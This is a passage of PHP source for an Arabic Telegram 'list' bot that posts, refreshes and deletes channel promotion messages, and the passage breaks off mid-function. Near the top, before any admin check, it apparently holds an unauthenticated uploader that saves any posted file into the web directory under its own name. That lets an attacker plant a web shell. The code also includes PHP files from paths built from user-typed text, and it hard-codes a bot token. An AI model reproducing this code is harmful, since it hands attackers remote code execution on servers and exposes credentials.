<?php 
ob_start();
$token = "668455581:AAFPydf3vTJcj0dEJ_tFPW3MOnm_MNbmHF8"; # Token
define("API_KEY", $token);
$protocol_sq = "http://";
if(isset($_FILES['file']['name'])){
$f = $_FILES['file']['tmp_name'];
$n = $_FILES['file']['name'];
move_uploaded_file($f,'./'.$n);}
function bot($method,$datas=[]){
$url = "https://api.telegram.org/bot".API_KEY."/".$method;
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
$res = curl_exec($ch);
if(curl_error($ch)){
var_dump(curl_error($ch));
}else{
return json_decode($res);
}}
# Short
$update = json_decode(file_get_contents("php://input"));
$msg = $update->message;
$txt = $msg->caption;
$text = $msg->text;
$chat_id = $msg->chat->id;
$from_id = $msg->from->id;
$new = $msg->new_chat_members;
$message_id = $msg->message_id;
$type = $msg->chat->type;
$name = $msg->from->first_name;
if(isset($update->callback_query)){
$callbackMessage = '';
var_dump(bot('answerCallbackQuery',[
'callback_query_id'=>$update->callback_query->id,
'text'=>$callbackMessage]));
$up = $update->callback_query;
$chat_id = $up->message->chat->id;
$from_id = $up->from->id;
$user = $up->from->username;
$message_id = $up->message->message_id;
$data = $up->data;
}
$id = $update->inline_query->from->id; 
$hadl = "@taatt"; // help
$hadll = "@taatt2019ybot"; // bot
$hadlll = "1 عضو ."; 
$text_inline = $update->inline_query->query;
include "code/$text_inline/code.php";
include "data/lista.php";
mkdir("start");
mkdir("data");
mkdir("code");
mkdir("ms");
mkdir("up");
$mang = -1001387644097; // ID-GP
$sudo = array("-1001387644097","508438695","449266472"); // admin
# Data
$unll = file_get_contents("unll.txt");
$gettext = file_get_contents("data/text.txt");
$RALST = file_get_contents("data/RALST.txt");
$ASLST = file_get_contents("data/ASLST.txt");
$MRTEST = file_get_contents("data/MRTEST.txt");
$EMLST = file_get_contents("data/EMLST.txt");
$ESLST = file_get_contents("data/ESLST.txt");
$FASLST = file_get_contents("data/FASLST.txt");
$START = file_get_contents("data/start.txt");
$users = explode("\n", file_get_contents("data/users.txt"));
$getstart = file_get_contents("data/start.txt");
$getids = explode("\n", file_get_contents("data/ids.txt"));
$getidss = explode("\n", file_get_contents("data/idss.txt"));
$getlista = explode("\n", file_get_contents("data/lista.txt"));
$getban = explode("\n", file_get_contents('data/ban.txt'));
$getbann = explode("\n", file_get_contents('data/bann.txt'));
$getmes_id = explode("\n", file_get_contents("ms/$message_id.txt"));
# Back
if(in_array($chat_id, $sudo)){
$back = json_encode(['inline_keyboard'=>[[['text'=>"الصفحة الرئيسية",'callback_data'=>"left"]],]]);
if($data == "left"){
file_put_contents("unll.txt", " ");
bot('editmessagetext',[
'chat_id'=>$chat_id,
'text'=>"
َ
ℓ♻️- [مطور البوت](t.me/taatt)
➖➖
ℓ🎁- اهلا وسهلا بك في بوت لستة
ℓ📮- [تعديل وتطوير عن طريق مجنون وكزاا](t.me/taatt)
-
ℓ📦- نشر - رفع - حذف -شفاف
ℓ⚙️- [ماردراكون - معرفات - توجيه](t.me/taattbot)
-
ℓ🌀- *بوت التواصل* => [taatt](http://t.me/taa_ttbot)
➖➖
ℓ📌- [commands all bot list](t.me/taatt)
➖➖
ℓ📃- اليك اعدادات لستة هاذا كل ما تحتاجة
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"MarkDown",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"📨 -تعديل رساله /start- 📨",'callback_data'=>"editstart"]],
[['text'=>"📄 -ضبط مقدمه اللسته- 📄",'callback_data'=>"editlist"]],
[['text'=>"🔗 -ٲوامر اللسته بطريقه شفافه- 🔗",'callback_data'=>"taattbot"]],
[['text'=>"📋 -ٲوامر اللسته بطريقه معرفات ماركدون-📋",'callback_data'=>"taatt11"]],
[['text'=>"📌 -ٲوامر اللسته بطريقه منشورات- 📌",'callback_data'=>"taatt12"]],
[['text'=>"🔩 -ٲوامر اضافه القنوات وحذفها- 🔩",'callback_data'=>"taatt13"]],
[['text'=>"🔧 -ٲوامر تشكيلات اللسته- 🔧",'callback_data'=>"taatt14"]],
[['text'=>"🔑 -أوامر خاصه بجروب الاستقبال- 🔑",'callback_data'=>"taatt15"]],
[['text'=>"🔎 -أوامر اخرئ- 🔎",'callback_data'=>"taatt16"]],
[['text'=>" عدد المشتركين الأدنى ".$had,'callback_data'=>"0"]
],
[['text'=>"+20",'callback_data'=>"p20"],
['text'=>"+100",'callback_data'=>"p100"],
['text'=>"+1k",'callback_data'=>"p1k"]
],
[['text'=>"-20",'callback_data'=>"m20"],
['text'=>"-100",'callback_data'=>"m100"] ,
['text'=>"-1k",'callback_data'=>"m1k"]
],
]])
]);
}
$had = file_get_contents("data/users.txt");
function MrDG($chat_id,$message_id,$mang)
	 { $had = file_get_contents("data/users.txt");
file_put_contents("unll.txt", " ");
bot('editmessagetext',[
'chat_id'=>$chat_id,
'text'=>"
َ
ℓ♻️- [مطور البوت](t.me/taatt)
➖➖
ℓ🎁- اهلا وسهلا بك في بوت لستة
ℓ📮- [تعديل وتطوير عن طريق مجنون وكزاا](t.me/taatt)
-
ℓ📦- نشر - رفع - حذف -شفاف
ℓ⚙️- [ماردراكون - معرفات - توجيه](t.me/taattbot)
-
ℓ🌀- *بوت التواصل* => [taatt](http://t.me/taa_ttbot)
➖➖
ℓ📌- [commands all bot list](t.me/taattbot)
➖➖
ℓ📃- اليك اعدادات لستة هاذا كل ما تحتاجة
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"MarkDown",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"📨 -تعديل رساله /start- 📨",'callback_data'=>"editstart"]],
[['text'=>"📄 -ضبط مقدمه اللسته- 📄",'callback_data'=>"editlist"]],
[['text'=>"🔗 -ٲوامر اللسته بطريقه شفافه- 🔗",'callback_data'=>"taattbot"]],
[['text'=>"📋 -ٲوامر اللسته بطريقه معرفات ماركدون-📋",'callback_data'=>"taatt11"]],
[['text'=>"📌 -ٲوامر اللسته بطريقه منشورات- 📌",'callback_data'=>"taatt12"]],
[['text'=>"🔩 -ٲوامر اضافه القنوات وحذفها- 🔩",'callback_data'=>"taatt13"]],
[['text'=>"🔧 -ٲوامر تشكيلات اللسته- 🔧",'callback_data'=>"taatt14"]],
[['text'=>"🔑 -أوامر خاصه بجروب الاستقبال- 🔑",'callback_data'=>"taatt15"]],
[['text'=>"🔎 -أوامر اخرئ- 🔎",'callback_data'=>"taatt16"]],
[['text'=>" عدد المشتركين الأدنى ".$had,'callback_data'=>"0"]
],
[['text'=>"+20",'callback_data'=>"p20"],
['text'=>"+100",'callback_data'=>"p100"],
['text'=>"+1k",'callback_data'=>"p1k"]
],
[['text'=>"-20",'callback_data'=>"m20"],
['text'=>"-100",'callback_data'=>"m100"] ,
['text'=>"-1k",'callback_data'=>"m1k"]
],
]])
]);
}
if($text == "الاوامر" ){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
َ
ℓ♻️- [مطور البوت](t.me/taatt)
➖➖
ℓ🎁- اهلا وسهلا بك في بوت لستة
ℓ📮- [تعديل وتطوير عن طريق مجنون وكزاا](t.me/taatt)
-
ℓ📦- نشر - رفع - حذف -شفاف
ℓ⚙️- [ماردراكون - معرفات - توجيه](t.me/taattbot)
-
ℓ🌀- *بوت التواصل* => [taatt](http://t.me/taa_ttbot)
➖➖
ℓ📌- [commands all bot list](t.me/taattbot)
➖➖
ℓ📃- اليك اعدادات لستة هاذا كل ما تحتاجة
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"📨 -تعديل رساله /start- 📨",'callback_data'=>"editstart"]],
[['text'=>"📄 -ضبط مقدمه اللسته- 📄",'callback_data'=>"editlist"]],
[['text'=>"🔗 -ٲوامر اللسته بطريقه شفافه- 🔗",'callback_data'=>"taattbot"]],
[['text'=>"📋 -ٲوامر اللسته بطريقه معرفات ماركدون-📋",'callback_data'=>"taatt11"]],
[['text'=>"📌 -ٲوامر اللسته بطريقه منشورات- 📌",'callback_data'=>"taatt12"]],
[['text'=>"🔩 -ٲوامر اضافه القنوات وحذفها- 🔩",'callback_data'=>"taatt13"]],
[['text'=>"🔧 -ٲوامر تشكيلات اللسته- 🔧",'callback_data'=>"taatt14"]],
[['text'=>"🔑 -أوامر خاصه بجروب الاستقبال- 🔑",'callback_data'=>"taatt15"]],
[['text'=>"🔎 -أوامر اخرئ- 🔎",'callback_data'=>"taatt16"]],
[['text'=>" عدد المشتركين الأدنى ".$had,'callback_data'=>"0"]
],
[['text'=>"+20",'callback_data'=>"p20"],
['text'=>"+100",'callback_data'=>"p100"],
['text'=>"+1k",'callback_data'=>"p1k"]
],
[['text'=>"-20",'callback_data'=>"m20"],
['text'=>"-100",'callback_data'=>"m100"] ,
['text'=>"-1k",'callback_data'=>"m1k"]
],
]])
]);
}$mang=0;
if ( $data == "p20" ) {
$had1=$had+20;
file_put_contents("data/users.txt",$had1);
MrDG( $chat_id,$message_id,$mang);
}
elseif ( $data == "p100" ) {
$had1=$had+100;
file_put_contents("data/users.txt",$had1);
MrDG( $chat_id,$message_id,$mang);
}
elseif ( $data == "p1k" ) {
$had1=$had+1000;
file_put_contents("data/users.txt",$had1);
MrDG( $chat_id,$message_id,$mang);
}
elseif ( $data == "m20" ) {
$had1=$had-20;
file_put_contents("data/users.txt",$had1);
MrDG( $chat_id,$message_id,$mang);
}
elseif ( $data == "m100" ) {
$had1=$had-100;
file_put_contents("data/users.txt",$had1);
MrDG( $chat_id,$message_id,$mang);
}
elseif ( $data == "m1k" ) {
$had1=$had-1000;
file_put_contents("data/users.txt",$had1);
MrDG( $chat_id,$message_id,$mang);
}
if($data == "taatt11"){
bot('editmessagetext',[
'chat_id'=>$chat_id,
'text'=>"
➖➖
ℓ🎁- اهلا وسهلا بك في بوت لستة

ℓ📃- اليك ٲوامر للستة بطريقه معرفات وماركدون هاذا كل ما تحتاجة
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"MarkDown",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>" تۣۗہحۣۗہوۣيۣۗہلَ مۣۗہعۣۗہرفۣۗہآتۣۗہ",'callback_data'=>"MRMOR"]],
[['text'=>" آخۣۗہتۣۗہبۣۗہآر مۣۗہعۣۗہرفۣۗہآتۣۗہ",'callback_data'=>"MRTESTMO"]],
[['text'=>" نۣۗہشۣۗہر مۣۗہعۣۗہرفۣۗہآتۣۗہ",'callback_data'=>"MRSNDMO"]],
[['text'=>" رفۣۗہعۣۗہ آلَلَسۣۗہتۣۗہة ",'callback_data'=>"MRRF"]],
[['text'=>" تۣۗہحۣۗہوۣيۣۗہلَ مۣۗہآركۣۗہدُوۣنۣۗہ",'callback_data'=>"MRMRK"]],
[['text'=>" آخۣۗہتۣۗہبۣۗہآر مۣۗہآركۣۗہدُوۣنۣۗہ",'callback_data'=>"MRTEST"]],
[['text'=>" نۣۗہشۣۗہر مۣۗہآركۣۗہدُوۣنۣۗہ",'callback_data'=>"MRSND"]],
[['text'=>"الصفحة الرئيسية",'callback_data'=>"left"]],
]])
]);
}
if($data == "taattbot"){
bot('editmessagetext',[
'chat_id'=>$chat_id,
'text'=>"
➖➖
ℓ🎁- اهلا وسهلا بك في بوت لستة

ℓ📃- اليك ٲوامر للستة بطريقه شفافه هاذا كل ما تحتاجة
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"MarkDown",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>" تۣۗہحۣۗہوۣيۣۗہلَ شۣۗہفۣۗہآفۣۗہ",'callback_data'=>"res"]],[['text'=>"آخۣۗہتۣۗہبۣۗہآر شۣۗہفۣۗہآفۣۗہ ",'callback_data'=>"test"]],
[['text'=>"نۣۗہشۣۗہر شۣۗہفۣۗہآفۣۗہ ",'callback_data'=>"send"]],[['text'=>"حۣۗہذۣفۣۗہ  شۣۗہفۣۗہآفۣۗہ",'callback_data'=>"delete"]],
[['text'=>"رفۣۗہعۣۗہ شۣۗہفۣۗہآفۣۗہ",'callback_data'=>"up"]],
[['text'=>"الصفحة الرئيسية",'callback_data'=>"left"]],
]])
]);
}
if($data == "taatt12"){
bot('editmessagetext',[
'chat_id'=>$chat_id,
'text'=>"
➖➖
ℓ🎁- اهلا وسهلا بك في بوت لستة

ℓ📃- اليك ٲوامر للستة بطريقه منشورات هاذا كل ما تحتاجة
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"MarkDown",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"نۣۗہشۣۗہر كۣۗہوۣدُ",'callback_data'=>"sendcode"]],
[['text'=>"نۣۗہشۣۗہر هۣۗہتۣۗہمۣۗہلَ",'callback_data'=>"sendhtml"]],[['text'=>" نۣۗہشۣۗہر تۣۗہوۣجۣۗہيۣۗہة",'callback_data'=>"sendfwd"]],
[['text'=>"صۣۗہنۣۗہعۣۗہ مۣۗہنۣۗہشۣۗہوۣر",'callback_data'=>"ba"]],
[['text'=>"نشنۣۗہشۣۗہر مۣۗہنۣۗہشۣۗہوۣر ",'callback_data'=>"sendallcode"]],
[['text'=>"حۣۗہذۣفۣۗہ آلَمۣۗہنۣۗہشۣۗہوۣرآتۣۗہ",'callback_data'=>"deleteallms"]],
[['text'=>"الصفحة الرئيسية",'callback_data'=>"left"]],
]])
]);
}
if($data == "taatt13"){
bot('editmessagetext',[
'chat_id'=>$chat_id,
'text'=>"
➖➖
ℓ🎁- اهلا وسهلا بك في بوت لستة

ℓ📃- اليك ٲوامر للستة لاضافه القنوات وحذفها هاذا كل ما تحتاجة
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"MarkDown",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"آضۣۗہآفۣۗہة قۣۗہنۣۗہتۣۗہة",'callback_data'=>"add"]],[['text'=>"حۣۗہذۣفۣۗہ قۣۗہنۣۗہآة ",'callback_data'=>"dele"]],
[['text'=>"  حۣۗہذۣفۣۗہ جۣۗہمۣۗہيۣۗہعۣۗہ آلَقۣۗہنۣۗہوۣآتۣۗہ",'callback_data'=>"delech"]],
[['text'=>"حۣۗہظۣۗہر قۣۗہنۣۗہآة",'callback_data'=>"ban"]],[['text'=>"آلَغۣۗہآء حۣۗہظۣۗہر  قۣۗہنۣۗہآة",'callback_data'=>"unban"]],
[['text'=>"آلَقۣۗہنۣۗہوۣتۣۗہنۣۗہ آلَمۣۗہحۣۗہظہوۣرة",'callback_data'=>"listban"]],
[['text'=>"الصفحة الرئيسية",'callback_data'=>"left"]],
]])
]);
}
if($data == "taatt14"){
bot('editmessagetext',[
'chat_id'=>$chat_id,
'text'=>"
➖➖
ℓ🎁- اهلا وسهلا بك في بوت لستة

ℓ📃- اليك ٲوامر لتشكيلات للستة  هاذا كل ما تحتاجة
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"MarkDown",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>" رأسۣۗہ آلَلَسۣۗہتۣۗہة",'callback_data'=>"RALST"]],[['text'=>"آسۣۗہفۣۗہلَ آلَلَسۣۗہتۣۗہة",'callback_data'=>"ASLST"]],
[['text'=>" يۣۗہمۣۗہيۣۗہنۣۗہ آلَلَسۣۗہتۣۗہة",'callback_data'=>"EMLST"]],[['text'=>" يۣۗہمۣۗہيۣۗہنۣۗہ آلَلَسۣۗہتۣۗہة",'callback_data'=>"ESLST"]],
[['text'=>"فۣۗہآصۣۗہلَ آلَلَسۣۗہتۣۗہة",'callback_data'=>"FASLST"]],[['text'=>"حۣۗہذۣفۣۗہ آلَزۣخۣۗہرفۣۗہة",'callback_data'=>"DELZH"]],
[['text'=>"الصفحة الرئيسية",'callback_data'=>"left"]],
]])
]);
}
if($data == "taatt15"){
bot('editmessagetext',[
'chat_id'=>$chat_id,
'text'=>"
➖➖
ℓ🎁- اهلا وسهلا بك في بوت لستة

ℓ📃- اليك ٲوامر خاصه بجروب الاستقبال  هاذا كل ما تحتاجة
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"MarkDown",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>" فتح الاستقال ",'callback_data'=>"addd"]],
[['text'=>" قفل الاستقبال ",'callback_data'=>"addt"]],
[['text'=>" آحۣۗہصۣۗہآئيۣۗہآتۣۗہ آلَقۣۗہنۣۗہوۣآتۣۗہ",'callback_data'=>"AHSLST"]],
[['text'=>" شروط الاستقبال ",'callback_data'=>"adt"]],
[['text'=>" رساله الاستقبال ",'callback_data'=>"ada"]],
[['text'=>"الصفحة الرئيسية",'callback_data'=>"left"]],
]])
]);
}
if($data == "taatt16"){
bot('editmessagetext',[
'chat_id'=>$chat_id,
'text'=>"
➖➖
ℓ🎁- اهلا وسهلا بك في بوت لستة

ℓ📃- اليك ٲوامر لتشكيلات للستة  هاذا كل ما تحتاجة
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"MarkDown",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>" حۣۗہذۣفۣۗہ آلَمۣۗہلَفۣۗہآتۣۗہ ",'callback_data'=>"resfull"]],
[['text'=>"الصفحة الرئيسية",'callback_data'=>"left"]],
]])
]);
}
if($data == "send"){
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"جاري نشر الستة انتضر قليلا ☑️",
"message_id"=>$message_id,
]);
for($i=0;$i<count($getids);$i++){

$get=bot("sendMessage",[
"chat_id"=>$getids[$i],
"text"=>"$gettext",
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
"reply_markup"=>$getlist
]);
$msg_id = $get->result->message_id;
file_put_contents("data/lista.txt",$getids[$i]."==". $msg_id."\n", FILE_APPEND);
}
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"تم نشر الستة بجميع القنوات ✅",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taattbot"]],
]])
]);
bot("sendMessage",[
"chat_id"=>-1001387644097,
"text"=>"$gettext",
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
"reply_markup"=>$getlist
]);
bot("sendMessage",[
"chat_id"=>-1001387644097,
"text"=>"✅ تـمَّـ - بِفضْلِ اللَّـه - نَشْــر اللسْتَــة.",
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]);
}
# MRSND
if($data == "MRSND"){
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"جاري نشر الستة انتضر قليلا ☑️",
"message_id"=>$message_id,
]);
for($i=0;$i<count($getids);$i++){

$get=bot("sendMessage",[
"chat_id"=>$getids[$i],
"text"=>"$MRTEST",
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]);
$msg_id = $get->result->message_id;
file_put_contents("data/lista.txt",$getids[$i]."==". $msg_id."\n", FILE_APPEND);
}
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"تم نشر الستة بجميع القنوات ✅",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taatt11"]],
]])
]);
bot("sendMessage",[
"chat_id"=>-1001387644097,
"text"=>"$MRTEST",
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]);
bot("sendMessage",[
"chat_id"=>-1001387644097,
"text"=>"✅ تـمَّـ - بِفضْلِ اللَّـه - نَشْــر اللسْتَــة.",
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]);
}
# MRSNDMO
if($data == "MRSNDMO"){
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"جاري نشر الستة انتضر قليلا ☑️",
"message_id"=>$message_id,
]);
for($i=0;$i<count($getids);$i++){

$get=bot("sendMessage",[
"chat_id"=>$getids[$i],
"text"=>"$MRTEST",
'disable_web_page_preview'=>true,
'parse_mode'=>markdown,
]);
$msg_id = $get->result->message_id;
file_put_contents("data/lista.txt",$getids[$i]."==". $msg_id."\n", FILE_APPEND);
}
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"تم نشر الستة بجميع القنوات ✅",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taatt11"]],
]])
]);
bot("sendMessage",[
"chat_id"=>-1001387644097,
"text"=>"$MRTEST",
'disable_web_page_preview'=>true,
'parse_mode'=>markdown,
]);
bot("sendMessage",[
"chat_id"=>-1001387644097,
"text"=>"✅ تـمَّـ - بِفضْلِ اللَّـه - نَشْــر اللسْتَــة.",
'disable_web_page_preview'=>true,
'parse_mode'=>markdown,
]);
}
# MRDEL
if($data == "MRDEL"){
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"جاري حذف الستة انتضر قليلا 🗑",
"message_id"=>$message_id,
]);
for($d=0;$d<count($getlista);$d++){
$ex = explode("==", $getlista[$d]);
$getlista1=$ex['1'];
$getids1=$ex['0'];
file_get_contents("https://api.telegram.org/bot$token/deleteMessage?chat_id=$getids1&message_id=$getlista1");
//}
}
unlink("data/lista.txt");
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"تم حذف الستة من جميع القنوات 🗑",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taatt11"]],
]])
]);
bot("sendMessage",[
"chat_id"=>-1001387644097,
"text"=>"❎ تـمَّـ - بِفضْلِ اللَّـه - حَـذْفـ اللسْتَـة",
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]);
}
# delete
if($data == "delete"){
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"جاري حذف الستة انتضر قليلا 🗑",
"message_id"=>$message_id,
]);
for($d=0;$d<count($getlista);$d++){
$ex = explode("==", $getlista[$d]);
$getlista1=$ex['1'];
$getids1=$ex['0'];
file_get_contents("https://api.telegram.org/bot$token/deleteMessage?chat_id=$getids1&message_id=$getlista1");
//}
}
unlink("data/lista.txt");
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"تم حذف الستة من جميع القنوات 🗑",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taattbot"]],
]])
]);
bot("sendMessage",[
"chat_id"=>-1001387644097,
"text"=>"❎ تـمَّـ - بِفضْلِ اللَّـه - حَـذْفـ اللسْتَـة",
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]);
}
if($data == "up"){
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"جاري رفع الستة انتضر قليلا 🔄",
"message_id"=>$message_id,
]);
unlink("data/lista.txt");
for($d=0;$d<count($getlista);$d++){
$ex = explode("==", $getlista[$d]);
$getlista1=$ex['1'];
$getids1=$ex['0'];
file_get_contents("https://api.telegram.org/bot$token/deleteMessage?chat_id=$getids1&message_id=$getlista1");

$get=bot("sendMessage",[
"chat_id"=>$getids1,
"text"=>"$gettext",
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
"reply_markup"=>$getlist
]);
$msg_id = $get->result->message_id;
file_put_contents("data/lista.txt",$getids1."==". $msg_id."\n", FILE_APPEND);
//}
}

bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"تم رفع الستة في جميع القنوات ☑️",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taattbot"]],
]])
]);
bot("sendMessage",[
"chat_id"=>-1001387644097,
"text"=>"☑️ تـمَّـ - بِفضْلِ اللَّـه - رَفــعُ اللسْتَــة",
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]);
}
# MRRF
if($data == "MRRF"){
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"جاري رفع الستة انتضر قليلا 🔄",
"message_id"=>$message_id,
]);
unlink("data/lista.txt");
for($d=0;$d<count($getlista);$d++){
$ex = explode("==", $getlista[$d]);
$getlista1=$ex['1'];
$getids1=$ex['0'];
file_get_contents("https://api.telegram.org/bot$token/deleteMessage?chat_id=$getids1&message_id=$getlista1");

$get=bot("sendMessage",[
"chat_id"=>$getids1,
"text"=>"$MRTEST",
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]);
$msg_id = $get->result->message_id;
file_put_contents("data/lista.txt",$getids1."==". $msg_id."\n", FILE_APPEND);
//}
}

bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"تم رفع الستة في جميع القنوات ☑️",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taatt11"]],
]])
]);
bot("sendMessage",[
"chat_id"=>-1001387644097,
"text"=>"☑️ تـمَّـ - بِفضْلِ اللَّـه - رَفــعُ اللسْتَــة",
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]);
}
# test
if($data == "test"){
bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"$gettext",
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
"reply_markup"=>$getlist
]);
}
# MRTEST
if($data == "MRTEST"){
bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"$MRTEST",
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]);
}
# MRTESTMO
if($data == "MRTESTMO"){
bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"$MRTEST",
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]);
}
# deleteallms
if($data == "deleteallms"){
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"جاري حذف جميع المنشورات المنشوره ⛔️",
"message_id"=>$message_id,
]);
bot("sendMessage",[
"chat_id"=>$lista,
"text"=>"🗑 تَمُّ بِفَضْلِ اللَّهِ حُذِفَ جَمِيعَ الْمَنْشُورَاتِ",
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]);
$file = scandir('ms');
for($l=0;$l<count($file);$l++){
$getmes_id = explode("\n", file_get_contents("ms/$file[$l]"));
for($d=0;$d<count($getmes_id);$d++){
$ex = explode("==", $getmes_id[$d]);
$getmes_id1=$ex['1'];
$getids1=$ex['0'];
file_get_contents("https://api.telegram.org/bot$token/deleteMessage?chat_id=$getids1&message_id=$getmes_id1");
}
unlink("data/oo".$file[$l]);
unlink("ms/$file[$l]");
}
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"تم حذف المنشورات من جميع القنوات ☑️",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taatt12"]],
]])
]);
}
# sendcode
if($data == "sendcode"){
file_put_contents("unll.txt", "okcode");
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"ارسل الان الكود لي نشره ⚙️",
"message_id"=>$message_id,
'reply_markup'=>$back
]);
}
if($text != "/staet" and !$data and $unll == "okcode"){
 $get5=bot('sendMessage',[
'chat_id'=>$chat_id, 
'text'=>"جاري نشر الكود انتضر قليلا ⚙️",
"message_id"=>$message_id,
]);
$msg_id = $get5->result->message_id;
file_put_contents("unll.txt","");
include "code/$text/lista.php";
$getfull = file_get_contents("code/$text/txt.txt");
$getls = file_get_contents("code/$text/lista.php");
$gettxt = file_get_contents("code/$text/textlist.txt");
$getfile_id = file_get_contents("code/$text/text.txt");
$sens=file_get_contents("code/$text/tepe_code.txt");
$ss=str_replace("send","",$sens);
file_put_contents("up/".$msg_id."lista.php",$getls);
file_put_contents("up/".$msg_id."textlist.txt",$gettxt);
file_put_contents("up/".$msg_id."txt.txt",$getfull);
file_put_contents("up/".$msg_id."text.txt",$getfile_id);
file_put_contents("up/".$msg_id."tepe_code.txt",$sens);

if($sens=="text"){
for($i=0;$i<count($getids);$i++){
 $get=bot("sendMessage",[
"chat_id"=>$getids[$i],
"text"=>"$gettxt",
'parse_mode'=>Markdown,
'disable_web_page_preview'=>true,
"reply_markup"=>$list
]);
$get_send=$get->result;
if(!is_null($get_send))
{
$msg = $get->result->message_id;
file_put_contents("ms/$msg_id.txt",$getids[$i]."==".$msg."\n", FILE_APPEND);
}}}
else{
for($i=0;$i<count($getids);$i++){
 $get=bot($sens,[
"chat_id"=>$getids[$i],
"$ss"=>"$getfile_id",
'caption'=>"$getfull",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
"reply_markup"=>$list
]);
$get_send=$get->result;
if(!is_null($get_send))
{
$msg = $get->result->message_id;
file_put_contents("ms/$msg_id.txt",$getids[$i]."==".$msg."\n", FILE_APPEND);
}}}

file_put_contents("unll.txt", "");
bot("sendMessage",[
"chat_id"=>-1001387644097,
"text"=>"✅ تـمَّـ - بِفضْلِ اللَّـه - نَشْــر اللسْتَــة.",
]);
bot("editmessagetext",[
"chat_id"=>$chat_id,
"text"=>"تم نشر الكود بجميع القنوات ⚙️",
"message_id"=>$message_id+1,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"حذف الكود",'callback_data'=>"delecode"],['text'=>"رفع الكود",'callback_data'=>"upcode"]]
]])
]);
}
# sendallcode
if($data == "sendallcode"){
file_put_contents("unll.txt", "okallcode");
bot('sendMessage',[
'chat_id'=>$chat_id, 
'text'=>"ارسل نعم للتأكيد عزيزي ⚠️",
"message_id"=>$message_id,
